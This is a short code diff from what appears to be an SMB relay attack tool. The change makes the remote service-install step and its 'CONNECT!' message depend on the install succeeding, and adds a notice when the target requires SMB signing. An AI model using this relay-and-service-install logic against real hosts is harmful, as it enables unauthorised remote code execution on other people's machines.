@@ -61,11 +61,10 @@ class doAttack(Thread):
         # Here PUT YOUR CODE!
         # First of all check whether we're Guest in the target system.
         # If so, we're screwed.
-        self.installService.install()
-        print "[*] Service Installed.. CONNECT!"
-        self.installService.uninstall()
-
- 
+        result = self.installService.install()
+        if result is True:
+            print "[*] Service Installed.. CONNECT!"
+            self.installService.uninstall()
 
 class SMBClient(smb.SMB):
     def __init__(self, remote_name, extended_security = True, sess_port = 445):
@@ -73,7 +72,10 @@ class SMBClient(smb.SMB):
         smb.SMB.__init__(self,remote_name, remote_name, sess_port = sess_port)
 
     def neg_session(self):
-        return smb.SMB.neg_session(self, extended_security = self._extendedSecurity)
+        neg_sess = smb.SMB.neg_session(self, extended_security = self._extendedSecurity)
+        if self._SignatureRequired is True:
+            print "[!] Signature is REQUIRED on the other end, can't attack target"
+        return neg_sess
 
     def setUid(self,uid):
         self._uid = uid
